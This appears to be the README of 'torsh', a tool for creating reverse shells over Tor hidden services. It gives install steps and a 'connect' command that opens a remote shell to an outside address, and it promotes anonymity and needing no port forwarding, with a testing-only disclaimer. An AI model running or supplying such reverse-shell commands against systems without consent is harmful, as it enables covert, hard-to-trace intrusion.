![torsh Logo](https://raw.githubusercontent.com/pisoj/torsh/master/logo.png)

## About

Torsh is a tool that simplifies the creation of a reverse shell. It operates over [Tor](https://www.torproject.org/) network. This is great for anonymity and also helps with the setup. You don't need to do port forwarding or any other kind of presetup. It just works!

</p>

## Benefits

+ Creating reverse shell as a Tor hidden service
+ End to end Tor connection (no [Tor2Web](https://www.tor2web.org/) etc...)
+ No need for port forwarding
+ Easy & Quick to use!


## Installation

```
git clone https://github.com/pisoj/torsh.git
cd torsh
chmod +x ./install.sh
sudo ./install.sh
```

## Example usage

#### Listen
```
torsh listen -p 5000
```

#### Connect
```
torsh connect <address> -p 5000
```


## Disclaimer

This tool is only for testing and can only be used where strict consent has been given. Do not use it for illegal purposes! It is the end user’s responsibility to obey all applicable local, state and federal laws. I assume no liability and are not responsible for any misuse or damage caused by this tool and software.
